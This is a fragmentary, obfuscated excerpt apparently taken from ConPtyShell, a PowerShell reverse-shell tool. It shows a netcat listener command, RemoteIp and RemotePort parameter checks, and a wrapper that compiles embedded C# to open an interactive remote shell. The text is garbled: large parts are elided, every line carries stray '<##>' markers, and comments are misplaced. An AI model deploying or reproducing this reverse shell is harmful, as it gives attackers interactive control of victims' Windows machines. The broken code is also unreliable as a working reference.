 ...
 cat) | nc -lvnp 3001<##>
           <##>
            ...
            you can paste the following commands:<##>
                $z=80<##>
                $e=24<##>
                $T.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($z, $e)<##>
                $T.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($z, $e)<##>
            <##>
            <##>
        .PARAMETER RemoteIp<##>
...
<##>
    ...
    <##>
    if( $E.ContainsKey('Upgrade') ) {<##>
        $t = "upgrade"<##>
        $k = "shell"<##>
    }<##>
    else{<##>
  <##>
        if(-Not($E.ContainsKey('RemoteIp'))) {<##>
            throw "RemoteIp missing parameter"<##>
        }<##>
        <##>
        if(-Not($E.ContainsKey('RemotePort'))) {<##>
            throw "RemotePort missing parameter"<##>
        }<##>
    }<##>
    $t = @($t, $k, $J, $G, $y)<##>
    Add-Type -TypeDefinition $Q -Language CSharp<##>
<##>
    $D = [ConPtyShellMainClass]::ConPtyShellMain($t)<##>
    Write-Output $D<##>
}<##>
<##>
$Q = @"<##>
...
<##>
  ...
  //free pointer when not Successful<##>
...
<##>
        ...
        if (result == NTSTATUS_SUCCESS)<##>
            return infoPtr<##>
//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it<##>
        else<##>
            Marshal.FreeHGlobal(infoPtr)<##>
//free pointer when not Successful<##>
        return IntPtr.Zero<##>
...
<##>
    ...
    {<##>
        Thread.Sleep(500)<##>
//little tweak for slower connections<##>
